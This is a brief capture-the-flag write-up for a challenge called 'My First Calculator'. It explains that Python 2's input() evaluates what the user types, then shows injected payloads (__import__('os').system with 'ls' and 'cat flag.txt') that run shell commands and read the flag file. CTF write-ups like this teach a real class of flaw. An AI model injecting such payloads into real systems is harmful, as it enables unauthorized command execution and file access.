# My First Calculator

By entering anything other than a number we see it's running `input()` with python2, which is basically equivalent to `eval(input())` on python3


So uhhhh just:


` __import__('os').system('ls')`


oh hey flag.txt


`__import__('os').system('cat flag.txt')`


#### Flag:flag{please_use_python3}
